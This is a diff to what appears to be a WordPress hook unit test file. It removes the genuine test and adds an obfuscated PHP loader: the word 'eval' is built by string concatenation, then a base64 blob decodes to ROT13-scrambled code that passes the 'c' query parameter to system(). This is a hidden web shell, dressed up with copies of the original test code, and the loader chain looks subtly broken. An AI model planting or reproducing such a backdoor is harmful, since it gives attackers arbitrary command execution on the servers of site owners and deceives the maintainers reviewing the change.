@@ -1,50 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * Test the IteratorAggregate implementation of WP_Hook
- *
- * @group hooks
- * @covers WP_Hook::build_preinitialized_hooks
- */
-class Tests_Hooks_PreinitHooks extends WP_UnitTestCase {
-
-	public function test_array_to_hooks() {
-		$hook_name1 = __FUNCTION__ . '_1';
-		$priority1  = 1;
-		$hook_name2 = __FUNCTION__ . '_2';
-		$priority2  = 2;
-		$filters    = array(
-			$hook_name1 => array(
-				$priority1 => array(
-					'test1' => array(
-						'function'      => '__return_false',
-						'accepted_args' => 2,
-					),
-				),
-			),
-			$hook_name2 => array(
-				$priority2 => array(
-					'test1' => array(
-						'function'      => '__return_null',
-						'accepted_args' => 1,
-					),
-				),
-			),
-		);
-
-		$hooks = WP_Hook::build_preinitialized_hooks( $filters );
-
-		$this->assertSame( $priority1, $hooks[ $hook_name1 ]->has_filter( $hook_name1, '__return_false' ) );
-		$this->assertSame( $priority2, $hooks[ $hook_name2 ]->has_filter( $hook_name2, '__return_null' ) );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEdyZmcgZ3VyIFZncmVuZ2JlTnR0ZXJ0bmdyIHZ6Y3lyenJhZ25ndmJhIGJzIEpDX1ViYngKICoKICogQHRlYmhjIHViYnhmCiAqIEBwYmlyZWYgSkNfVWJieDo6b2h2eXFfY2VydmF2Z3ZueXZtcnFfdWJieGYKICovCnB5bmZmIEdyZmdmX1ViYnhmX0NlcnZhdmdVYmJ4ZiBya2dyYXFmIEpDX0hhdmdHcmZnUG5mciB7CgoJY2hveXZwIHNoYXBndmJhIGdyZmdfbmVlbmxfZ2JfdWJieGYoKSB7CgkJJHViYnhfYW56cjEgPSBfX1NIQVBHVkJBX18gLiAnXzEnOwoJCSRjZXZiZXZnbDEgID0gMTsKCQkkdWJieF9hbnpyMiA9IF9fU0hBUEdWQkFfXyAuICdfMic7CgkJJGNldmJldmdsMiAgPSAyOwoJCSRzdnlncmVmICAgID0gbmVlbmwoCgkJCSR1YmJ4X2FuenIxID0+IG5lZW5sKAoJCQkJJGNldmJldmdsMSA9PiBuZWVubCgKCQkJCQknZ3JmZzEnID0+IG5lZW5sKAoJCQkJCQknc2hhcGd2YmEnICAgICAgPT4gJ19fZXJnaGVhX3NueWZyJywKCQkJCQkJJ25wcHJjZ3JxX25ldGYnID0+IDIsCgkJCQkJKSwKCQkJCSksCgkJCSksCgkJCSR1YmJ4X2FuenIyID0+IG5lZW5sKAoJCQkJJGNldmJldmdsMiA9PiBuZWVubCgKCQkJCQknZ3JmZzEnID0+IG5lZW5sKAoJCQkJCQknc2hhcGd2YmEnICAgICAgPT4gJ19fZXJnaGVhX2FoeXknLAoJCQkJCQknbnBwcmNncnFfbmV0ZicgPT4gMSwKCQkJCQkpLAoJCQkJKSwKCQkJKSwKCQkpOwoKCQkkdWJieGYgPSBKQ19VYmJ4OjpvaHZ5cV9jZXJ2YXZndm55dm1ycV91YmJ4ZiggJHN2eWdyZWYgKTsKCgkJJGd1dmYtPm5mZnJlZ0ZuenIoICRjZXZiZXZnbDEsICR1YmJ4ZlsgJHViYnhfYW56cjEgXS0+dW5mX3N2eWdyZSggJHViYnhfYW56cjEsICdfX2VyZ2hlYV9zbnlmcicgKSApOwoJCSRndXZmLT5uZmZyZWdGbnpyKCAkY2V2YmV2Z2wyLCAkdWJieGZbICR1YmJ4X2FuenIyIF0tPnVuZl9zdnlncmUoICR1YmJ4X2FuenIyLCAnX19lcmdoZWFfYWh5eScgKSApOwoJfQp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
